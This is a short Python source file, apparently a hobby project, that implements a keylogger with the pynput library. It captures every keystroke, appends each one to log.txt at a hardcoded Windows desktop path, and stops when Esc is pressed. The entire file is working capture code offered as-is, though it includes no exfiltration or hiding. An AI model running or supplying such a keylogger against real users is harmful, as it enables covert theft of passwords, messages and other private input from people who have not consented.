# Author: Aleksa

# PATH UPDATED

import os
import time
from pynput.keyboard import Key, Listener

# KEY LOGS STORAGE FILE
keys_log = "log.txt"
path = "C:\\Users\\Korisnik\\Official\\Desktop\\Coding\\klog"

count = 0
keys = []

def on_press(key):

  global keys, count
  
  keys.append(key)
  count += 1

  # ADD NEW KEYS TO LOG.TXT
  if count >= 1:
    count = 0
    write_to_log(keys)
    keys = []

def write_to_log(keys):
  with open(path + "\\" + keys_log, "a") as file_:
    for key in keys:
      k = str(key).replace("'", "") # REPLACE '' WITH EMPTY SPACE

      # MAKE WORDS (FORMAT THE OUTPUT LOG)
      if k.find("space") > 0:
        file_.write('\n')
        file_.close()
      elif k.find("Key") == -1:
        file_.write(k)
        file_.close()
     
# EXIT KEYLOGGER
def on_release(key):
  if key == Key.esc:
    return False

# LISTENER (combine functions)
with Listener(on_press = on_press, on_release = on_release) as listener:
  listener.join()
